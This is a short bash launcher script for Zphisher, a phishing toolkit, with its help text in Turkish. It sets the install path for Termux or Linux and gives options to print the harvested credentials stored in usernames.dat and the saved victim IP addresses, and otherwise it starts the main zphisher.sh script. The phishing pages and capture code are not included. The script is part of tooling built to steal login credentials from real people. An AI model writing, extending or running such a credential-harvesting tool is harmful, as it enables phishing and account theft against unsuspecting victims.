#!/bin/bash

# https://github.com/htr-tech/zphisher

if [[ $(uname -o) == *'Android'* ]];then
	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
else
	export ZPHISHER_ROOT="/opt/zphisher"
fi

if [[ $1 == '-h' || $1 == 'help' || $1 == 'yardim' || $1 == 'yardim' ]]; then
	echo "Zphisher türünü çalıştırmak için \`zphisher\` senin cmd'nde"
	echo
	echo "Yardım:"
	echo " -h | help : Bu menüyü yazdır ve Çık"
	echo " -c | auth : Kayıtlı Kimlik Bilgilerini Görüntüle"
	echo " -i | ip   : Kayıtlı Kurban IP'sini Görüntüle"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "Kimlik Bilgisi Bulunamadı!"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "Kayıtlı IP Bulunamadı!"
		exit 1
	}
else
	cd $ZPHISHER_ROOT
	bash ./zphisher.sh
fi
